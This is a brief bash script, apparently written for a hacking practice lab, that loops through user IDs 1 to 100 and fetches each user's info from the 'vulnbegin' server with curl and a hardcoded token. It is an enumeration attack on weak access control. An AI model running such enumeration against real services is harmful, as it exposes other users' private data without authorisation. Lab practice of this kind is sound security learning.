#!/bin/bash

for i in {1..100};
  do
    printf "id: $i\n";
    curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" http://server.vulnbegin.co.uk/user/$i/info;
    printf "\n";
  done
